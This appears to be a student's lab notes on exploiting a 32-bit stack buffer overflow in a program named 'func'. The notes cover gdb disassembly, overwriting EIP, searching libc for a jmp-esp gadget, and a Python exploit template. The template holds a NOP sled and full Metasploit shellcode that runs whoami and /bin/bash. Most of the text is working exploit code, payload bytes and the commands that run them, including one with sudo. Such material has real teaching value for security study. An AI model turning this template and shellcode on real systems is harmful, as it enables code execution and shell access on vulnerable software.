GDU, linux debugger
```shell
diassemble main 
pdisass main
#green = a safe function that it knows of(usually doens't know)
# <getuserinput> - this was made by the  program
pdisass getuserinput
#the red will show the exloitable code
    call 0x3d0 <gets@plt>
    #no ned to breakdown down any...@plt. GOOGLE it
r # runs the code
eneter string: A-70
    # SIGSEGV - Fault(Seg)
    # IP has to point to a legitimate location
    # the IP that originally ran was over written by the A, so the A were put into it, and when it went back to the orginal stack pointer location there was an A. So it crashed.
EBP: 0x41414141 ('AAAA') # This is the end of the base pointer
ESP: 0xffffd250 --> 0xf7fe5900 (add    BYTE PTR [eax],al) # need to push out byte code vs string. 2.7 over 3
EIP: 0x42424242 ('BBBB') # The next point(stack shows the new data being inputted)
```
-------------------------------------------------------------------------------------------------
```python
#!/usr/bin/python

#offset size Prints characters for buffer to fill
buffer = 'A' * 62 ## 

# address where we want out shell code to execute
EIP = "BBBB"    # EIP in little Endian

# No Operation Leave at 10
nop = '\x90' * 10 

#Shell Code from Metasploit

#buf = #####

#Prints byte code to Std_Out
print(buffer + EIP) 

#print(buffer + EIP + nop + buf) # outputs exploit code and redirect to binary
```
-------------------------------------------------------------------------------------------------
# Run gdb differently
```shell
env - gdb ./func # basic level gdb
show env #unset all variable to clean out memory, inject variable will take up memory space and we don't want exztra memory being taken up by enviormental variables.
    # DEBUGGER VARIABLES
unset env LINES #unset env
unset ev COLUMNS #unset env
# Now you need to crash program
run func
-> A...a
*CRASH*
info proc map # this will show the crash report data points. these are the address point spaces and they will not change
Mapped address spaces:
 # looking for specific set of opcodes
	Start Addr   End Addr       Size     Offset objfile
	0x56555000 0x56556000     0x1000        0x0 /home/student/Downloads/func
	0x56556000 0x56557000     0x1000        0x0 /home/student/Downloads/func
	0x56557000 0x56558000     0x1000     0x1000 /home/student/Downloads/func
	0x56558000 0x5657a000    0x22000        0x0 [heap] # start at heap and go to stack------
	0xf7de1000 0xf7fb3000   0x1d2000        0x0 /lib32/libc-2.27.so
	0xf7fb3000 0xf7fb4000     0x1000   0x1d2000 /lib32/libc-2.27.so
	0xf7fb4000 0xf7fb6000     0x2000   0x1d2000 /lib32/libc-2.27.so
	0xf7fb6000 0xf7fb7000     0x1000   0x1d4000 /lib32/libc-2.27.so
	0xf7fb7000 0xf7fba000     0x3000        0x0 
	0xf7fcf000 0xf7fd1000     0x2000        0x0 
	0xf7fd1000 0xf7fd4000     0x3000        0x0 [vvar]
	0xf7fd4000 0xf7fd6000     0x2000        0x0 [vdso]
	0xf7fd6000 0xf7ffc000    0x26000        0x0 /lib32/ld-2.27.so
	0xf7ffc000 0xf7ffd000     0x1000    0x25000 /lib32/ld-2.27.so
	0xf7ffd000 0xf7ffe000     0x1000    0x26000 /lib32/ld-2.27.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack] #------------------------------------
(gdb) 
find /b 0xf7de1000, 0xf7ffe000, 0xff(JUMP), 0xe4(ESP)
find /b 0xf7de1000, 0xf7ffe000, 0xff, 0xe4
find /b 0xf7def000, 0xf7ffe000, 0xff, 0xe4
#first addres under HEAP to last address infront of the STACK
#these addresses are
EIP = "\x59\x3b\xde\xf7" 
# puts the stack pointer into EIP register is normal function
# It jumps to stack pointer with our code in it, and runs our shell code 
0xf7de3b59
0xf7f588ab
0xf7f645fb
-------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------

#!/usr/bin/python

#offset size Prints characters for buffer to fill
buffer = 'A' * 62 ## 

# address where we want out shell code to execute
EIP = "\x59\x3b\xde\xf7"    # EIP in little Endian

0xf7de3b59
0xf7f588ab
0xf7f645fb

# No Operation Leave at 10
nop = '\x90' * 10 

#Shell Code from Metasploit

#buf = #####

# AppendExit=false, CMD=whoami, NullFreeVersion=false
buf =  b""
buf += b"\xd9\xe9\xd9\x74\x24\xf4\x5b\xb8\xc0\x3a\xb0\x24"
buf += b"\x2b\xc9\xb1\x0b\x31\x43\x19\x83\xeb\xfc\x03\x43"
buf += b"\x15\x22\xcf\xda\x2f\xfa\xa9\x49\x56\x92\xe4\x0e"
buf += b"\x1f\x85\x9f\xff\x6c\x21\x60\x68\xbc\xd3\x09\x06"
buf += b"\x4b\xf0\x98\x3e\x4c\xf6\x1c\xbf\x24\x9e\x73\xde"
buf += b"\xa7\x37\x8c\x77\x6b\x4e\x6d\xba\x0b"
#Prints byte code to Std_Out
print(buffer + EIP + nop + buf) 
-------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------
Linux Payload

msf6 payload > use payload/linux/x86/exec
msf6 payload(linux/x86/exec) > set CMD whoami
msf6 payload(linux/x86/exec) > generate -f python -b "\x00\X0A\x0D\x20"
---------------------------------------------------------------------------
# -b means back characters, new line caracter return and backspace
####WHOAMI
# AppendExit=false, CMD=whoami, NullFreeVersion=false
buf =  b""
buf += b"\xd9\xe9\xd9\x74\x24\xf4\x5b\xb8\xc0\x3a\xb0\x24"
buf += b"\x2b\xc9\xb1\x0b\x31\x43\x19\x83\xeb\xfc\x03\x43"
buf += b"\x15\x22\xcf\xda\x2f\xfa\xa9\x49\x56\x92\xe4\x0e"
buf += b"\x1f\x85\x9f\xff\x6c\x21\x60\x68\xbc\xd3\x09\x06"
buf += b"\x4b\xf0\x98\x3e\x4c\xf6\x1c\xbf\x24\x9e\x73\xde"
buf += b"\xa7\x37\x8c\x77\x6b\x4e\x6d\xba\x0b"
---------------------------------------------------------------------------
####SHELL
# AppendExit=false, CMD=/bin/bash, NullFreeVersion=false
buf =  b""
buf += b"\xbb\x44\xf2\x1a\x11\xd9\xc5\xd9\x74\x24\xf4\x5a"
buf += b"\x29\xc9\xb1\x0c\x31\x5a\x13\x03\x5a\x13\x83\xc2"
buf += b"\x40\x10\xef\x7b\x43\x8c\x89\x2e\x35\x44\x87\xad"
buf += b"\x30\x73\xbf\x1e\x31\x14\x40\x09\x9a\x86\x29\xa7"
buf += b"\x6d\xa5\xf8\xdf\x67\x2a\xfd\x1f\x58\x48\x94\x71"
buf += b"\x89\xee\x07\xfd\xbd\xee\x90\x52\xb4\x0e\xd3\xd5"
---------------------------------------------------------------------------
## check fat finger, check proper generate and character deletion
 once added go back and run the pythong script agsasint func
# now run shell code agasint the application
./func <<< $(python Exploit_Template.py)
sudo ./func <<< $(python Exploit_Template.py)
file="/tmp/Exploit_Template.py'
cat $(echo $file)
```
1. buff
2. noop
3. no-op
4. shell code

```shell
#eliminate here string and drop on the command line
./func <<< $(python Downloads/Exploit_Template.py)

